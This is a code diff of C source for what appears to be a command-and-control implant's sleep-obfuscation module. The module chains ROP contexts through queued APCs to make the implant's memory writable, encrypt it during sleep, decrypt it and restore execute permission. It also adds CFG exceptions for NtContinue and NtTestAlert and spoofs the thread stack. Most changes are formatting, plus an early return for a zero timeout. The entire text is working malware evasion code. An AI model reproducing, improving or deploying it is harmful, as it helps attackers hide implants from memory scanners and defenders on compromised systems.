@@ -73,8 +73,8 @@ VOID FoliageObf( PSLEEP_PARAM Param )
     SIZE_T              ImageSize   = 0;
     SIZE_T              TmpValue    = 0;
 
-    ImageBase   = Instance.Session.ModuleBase;
-    ImageSize   = IMAGE_SIZE( Instance.Session.ModuleBase );
+    ImageBase = Instance.Session.ModuleBase;
+    ImageSize = IMAGE_SIZE( Instance.Session.ModuleBase );
 
     // Generate random keys
     for ( SHORT i = 0; i < 16; i++ )
@@ -179,7 +179,7 @@ VOID FoliageObf( PSLEEP_PARAM Param )
                     *( PVOID* )( RopSetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
                     // NtSetContextThread( Src, Spf );
 
-                    // NOTE: Here is the thread sleeping for a few seconds...
+                    // NOTE: Here is the thread sleeping...
                     RopWaitObj->ContextFlags = CONTEXT_FULL;
                     RopWaitObj->Rip  = U_PTR( Instance.Win32.WaitForSingleObjectEx );
                     RopWaitObj->Rsp -= U_PTR( 0x1000 * 8 );
@@ -226,16 +226,16 @@ VOID FoliageObf( PSLEEP_PARAM Param )
                     // RtlExitUserThread( ERROR_SUCCESS );
 
                     // queue
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopBegin, FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopBegin,    FALSE, NULL ) ) ) goto Leave;
                     if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetMemRw, FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopMemEnc, FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopGetCtx, FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetCtx, FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopWaitObj, FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopMemDec, FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopMemEnc,   FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopGetCtx,   FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetCtx,   FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopWaitObj,  FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopMemDec,   FALSE, NULL ) ) ) goto Leave;
                     if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetMemRx, FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetCtx2, FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopExitThd, FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetCtx2,  FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopExitThd,  FALSE, NULL ) ) ) goto Leave;
 
                     CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtContinue );
                     CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtTestAlert );
@@ -252,7 +252,7 @@ VOID FoliageObf( PSLEEP_PARAM Param )
 
                         RopSpoof->ContextFlags = CONTEXT_FULL;
                         RopSpoof->Rip = U_PTR( Instance.Win32.WaitForSingleObjectEx );
-                        RopSpoof->Rsp = U_PTR( Instance.ThreadEnvBlock->NtTib.StackBase ); // TODO: try to spoof the stack and remove the pointers
+                        RopSpoof->Rsp = U_PTR( Instance.Teb->NtTib.StackBase ); // TODO: try to spoof the stack and remove the pointers
 
                         // Execute every registered Apc thread
                         Instance.Syscall.NtSignalAndWaitForSingleObject( hEvent, hThread, FALSE, NULL );
@@ -474,6 +474,10 @@ VOID SleepObf( UINT32 TimeOut )
 {
     DWORD Technique = Instance.Config.Implant.SleepMaskTechnique;
 
+    /* dont do any sleep obf. waste of resources */
+    if ( TimeOut == 0 )
+        return;
+
     if ( Instance.Threads )
     {
         PRINTF( "Can't sleep obf. Threads running: %d\n", Instance.Threads )
@@ -507,6 +511,10 @@ VOID SleepObf( UINT32 TimeOut )
 
         default:
         {
+            /*
+             * Also check out RegisterWaitForSingleObjectEx
+             */
+
             SpoofFunc( Instance.Win32.WaitForSingleObjectEx, Instance.Modules.KernelBase, IMAGE_SIZE( Instance.Modules.KernelBase ), NtCurrentProcess(), TimeOut, FALSE );
         }
     }
